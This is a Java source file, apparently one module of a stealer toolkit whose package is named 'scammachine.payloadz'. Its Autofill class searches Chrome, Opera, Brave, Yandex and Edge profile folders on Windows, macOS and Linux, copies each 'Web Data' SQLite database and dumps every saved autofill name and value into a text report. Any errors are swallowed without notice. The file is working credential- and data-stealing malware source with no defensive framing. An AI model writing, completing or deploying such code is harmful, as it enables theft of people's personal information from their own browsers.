package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class Autofill
{
    public static String appdata() {
        return System.getenv("APPDATA");
    }
    public static String localAppdata() {
        return System.getenv("LOCALAPPDATA");
    }
    public static String home() {
        return System.getProperty("user.home");
    }

    public static String execute() {
        StringBuilder sb = new StringBuilder();
        Stream.of(new String[][]{
                {localAppdata() + "/Google/Chrome/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Default/Web Data"},
                {home() + "/.config/google-chrome/Default/Web Data"},
                {appdata() + "/Opera Software/Opera Stable/Default/Web Data"},
                {home() + "/Library/Application Support/Opera/Opera/Default/Web Data"},
                {home() + "/.config/opera/Default/Web Data"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Default/Web Data"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Web Data"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Default/Web Data"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Web Data"},
                {home() + "/.config/Yandex/YandexBrowser/Default/Web Data"},
                {localAppdata() + "/Microsoft/Edge/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Microsoft/Edge/Default/Web Data"},
                {home() + "/.config/Microsoft/Edge/Default/Web Data"}
        }).collect(Collectors.toMap(data -> new File(data[0]), data -> new File(data[0]))).entrySet().stream().filter(entry -> entry.getKey().exists() && entry.getValue().exists()).forEach((entry) -> {
            Connection c;
            Statement stm;

            try {
                TempFile tmpfile2 = FileUtils.readFile(entry.getValue().getAbsolutePath());
                ResultSet re = DriverManager.getConnection("jdbc:sqlite:" + tmpfile2.newpath).prepareStatement("SELECT date_created,date_last_used,name,value,count from `autofill` ORDER BY date_created").executeQuery();

                while (re.next()) {
                    String created = new String(re.getBytes(1));
                    String lastused = new String(re.getBytes(2));
                    String name = new String(re.getBytes(3));
                    String value = new String(re.getBytes(4));
                    String count = new String(re.getBytes(5));

                    String app = String.format("NAME: %s\nVALUE: %s\nCREATED: %s\nLAST USED: %s\nCOUNT: %s\n------------\n", name, value, created, lastused, count);
                    sb.append(app);
                }

                FileUtils.close(tmpfile2);
            }
            catch (Exception e)
            {

            }
        });

        return sb.toString();
    }
}
